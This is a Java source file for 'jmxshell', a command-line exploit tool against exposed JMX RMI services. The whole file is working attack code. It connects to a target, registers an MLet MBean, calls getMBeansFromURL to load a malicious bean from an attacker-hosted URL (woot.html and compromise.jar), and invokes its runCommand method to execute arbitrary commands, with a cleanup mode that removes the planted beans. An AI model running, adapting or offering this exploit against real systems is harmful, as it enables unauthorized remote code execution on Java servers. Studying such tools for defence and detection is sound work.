package com.jmxshell;

import javax.management.InstanceAlreadyExistsException;
import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import java.io.InputStream;
import java.net.URL;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;
import java.util.jar.Manifest;

public class JmxShell {

    private static final String OBJECT_NAME = "MLetCompromise:name=evil,id=2";
    static final String VERSION;
    static final String BUILD_JDK_TARGET;

    static {
        Manifest mf = loadOwnManifest();
        VERSION = manifestValue(mf, "Implementation-Version", "dev");
        BUILD_JDK_TARGET = manifestValue(mf, "Build-Jdk-Target", "unknown");
    }

    public static void main(String[] args) {
        try {
            Options opts = parseArgs(args);
            if (opts.help) {
                printUsage(System.out);
                return;
            }
            if (opts.version) {
                System.out.println(versionLine());
                return;
            }
            if (opts.cleanup) {
                cleanup(opts.host, opts.port, opts.username, opts.password);
            } else {
                exploit(opts.host, opts.port, opts.command, opts.url, opts.username, opts.password);
            }
        } catch (UsageException e) {
            System.err.println("Error: " + e.getMessage());
            System.err.println();
            printUsage(System.err);
            System.exit(2);
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }
    }

    static void exploit(String host, String port, String command, String url,
                        String username, String password) throws Exception {
        JMXServiceURL serviceUrl = new JMXServiceURL(
                "service:jmx:rmi:///jndi/rmi://" + host + ":" + port + "/jmxrmi");
        System.out.println("URL: " + serviceUrl + ", connecting"
                + (username != null ? " as " + username : ""));

        JMXConnector c = JMXConnectorFactory.connect(serviceUrl, credentialsEnv(username, password));
        try {
            System.out.println("Connected: " + c.getConnectionId());
            MBeanServerConnection m = c.getMBeanServerConnection();

            ObjectInstance evilBean;
            try {
                evilBean = m.getObjectInstance(new ObjectName(OBJECT_NAME));
            } catch (Exception e) {
                evilBean = null;
            }

            if (evilBean == null) {
                System.out.println("Trying to create bean...");
                ObjectInstance evil;
                try {
                    evil = m.createMBean("javax.management.loading.MLet", null);
                } catch (InstanceAlreadyExistsException e) {
                    System.out.println("DefaultDomain:type=MLet already exists");
                    evil = m.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
                }
                System.out.println("Loaded " + evil.getClassName());

                System.out.println("Sending URL: " + url);
                Object res = m.invoke(evil.getObjectName(), "getMBeansFromURL",
                        new Object[]{ String.format("%s/woot.html", url) },
                        new String[]{ String.class.getName() });
                Set<?> resSet = (Set<?>) res;
                Object next = resSet.iterator().next();
                System.out.println("nextObject = " + next);
                if (next instanceof Exception) {
                    throw (Exception) next;
                }
                evilBean = (ObjectInstance) next;
            }

            System.out.println("Loaded class: " + evilBean.getClassName()
                    + " object " + evilBean.getObjectName());
            System.out.println("Calling runCommand with: " + command);
            Object result = m.invoke(evilBean.getObjectName(), "runCommand",
                    new Object[]{ command }, new String[]{ String.class.getName() });
            System.out.println("Result: " + result);
        } finally {
            try { c.close(); } catch (Exception ignore) { /* best effort */ }
        }
    }

    static void cleanup(String host, String port, String username, String password) throws Exception {
        JMXServiceURL serviceUrl = new JMXServiceURL(
                "service:jmx:rmi:///jndi/rmi://" + host + ":" + port + "/jmxrmi");
        System.out.println("URL: " + serviceUrl + ", connecting"
                + (username != null ? " as " + username : ""));

        JMXConnector c = JMXConnectorFactory.connect(serviceUrl, credentialsEnv(username, password));
        try {
            System.out.println("Connected: " + c.getConnectionId());
            MBeanServerConnection m = c.getMBeanServerConnection();

            for (ObjectInstance x : m.queryMBeans(null, null)) {
                String name = x.getObjectName().toString();
                System.out.println("Checking " + name);
                if (name.startsWith("DefaultDomain:type=MLet")
                        || name.startsWith("MLetCompromise")
                        || name.startsWith("MLet")) {
                    System.out.println("Removing " + name);
                    m.unregisterMBean(x.getObjectName());
                }
            }
            System.out.println("Exiting after cleanup");
        } finally {
            try { c.close(); } catch (Exception ignore) { /* best effort */ }
        }
    }

    static Map<String, Object> credentialsEnv(String username, String password) {
        if (username == null) return null;
        Map<String, Object> env = new HashMap<String, Object>();
        env.put(JMXConnector.CREDENTIALS, new String[]{ username, password });
        return env;
    }

    static class Options {
        boolean cleanup;
        boolean help;
        boolean version;
        String host;
        String port;
        String command;
        String url;
        String username;
        String password;
    }

    static String versionLine() {
        return "jmxshell " + VERSION + " (built for JDK " + BUILD_JDK_TARGET + ")";
    }

    private static Manifest loadOwnManifest() {
        try {
            ClassLoader cl = JmxShell.class.getClassLoader();
            if (cl == null) cl = ClassLoader.getSystemClassLoader();
            Enumeration<URL> urls = cl.getResources("META-INF/MANIFEST.MF");
            while (urls.hasMoreElements()) {
                URL url = urls.nextElement();
                InputStream in = null;
                try {
                    in = url.openStream();
                    Manifest mf = new Manifest(in);
                    String title = mf.getMainAttributes().getValue("Implementation-Title");
                    if ("jmxshell".equals(title)) {
                        return mf;
                    }
                } catch (Exception ignore) {
                    // try next manifest
                } finally {
                    if (in != null) try { in.close(); } catch (Exception ignore) {}
                }
            }
        } catch (Exception ignore) {
            // fall through to null
        }
        return null;
    }

    private static String manifestValue(Manifest mf, String name, String fallback) {
        if (mf == null) return fallback;
        String v = mf.getMainAttributes().getValue(name);
        return (v == null || v.isEmpty()) ? fallback : v;
    }

    static class UsageException extends Exception {
        UsageException(String message) { super(message); }
    }

    static Options parseArgs(String[] args) throws UsageException {
        Options o = new Options();

        for (int i = 0; i < args.length; i++) {
            String a = args[i];
            if ("--cleanup".equals(a)) {
                o.cleanup = true;
            } else if ("--help".equals(a) || "-h".equals(a)) {
                o.help = true;
            } else if ("--version".equals(a) || "-V".equals(a)) {
                o.version = true;
            } else if ("--host".equals(a)) {
                o.host = nextValue(args, ++i, "--host");
            } else if ("--port".equals(a)) {
                o.port = nextValue(args, ++i, "--port");
            } else if ("--command".equals(a)) {
                o.command = nextValue(args, ++i, "--command");
            } else if ("--url".equals(a)) {
                o.url = nextValue(args, ++i, "--url");
            } else if ("--username".equals(a)) {
                o.username = nextValue(args, ++i, "--username");
            } else if ("--password".equals(a)) {
                o.password = nextValue(args, ++i, "--password");
            } else {
                throw new UsageException("Unknown argument: " + a);
            }
        }

        if (!o.help && !o.version) {
            if (o.host == null) throw new UsageException("--host is required");
            if (o.port == null) throw new UsageException("--port is required");
            if (!o.cleanup) {
                if (o.command == null) throw new UsageException("--command is required");
                if (o.url == null) throw new UsageException("--url is required");
            }
            if ((o.username == null) != (o.password == null)) {
                throw new UsageException("--username and --password must be supplied together");
            }
        }
        return o;
    }

    private static String nextValue(String[] args, int i, String flag) throws UsageException {
        if (i >= args.length) throw new UsageException("Missing value for " + flag);
        return args[i];
    }

    private static void printUsage(java.io.PrintStream out) {
        out.println(versionLine());
        out.println();
        out.println("Usage:");
        out.println("  jmxshell --host <host> --port <port> --command <cmd> --url <url>"
                + " [--username <user> --password <pass>]");
        out.println("  jmxshell --host <host> --port <port> --cleanup"
                + " [--username <user> --password <pass>]");
        out.println();
        out.println("Options:");
        out.println("  --host <host>       JMX RMI server hostname or IP");
        out.println("  --port <port>       JMX RMI server port");
        out.println("  --command <cmd>     Command to execute on the target (exploit mode)");
        out.println("  --url <url>         Base URL serving woot.html and compromise.jar");
        out.println("  --cleanup           Remove MLet beans previously installed by this tool");
        out.println("  --username <user>   JMX username (requires --password)");
        out.println("  --password <pass>   JMX password (requires --username)");
        out.println("  --help, -h          Print this help and exit");
        out.println("  --version, -V       Print version and exit");
    }
}
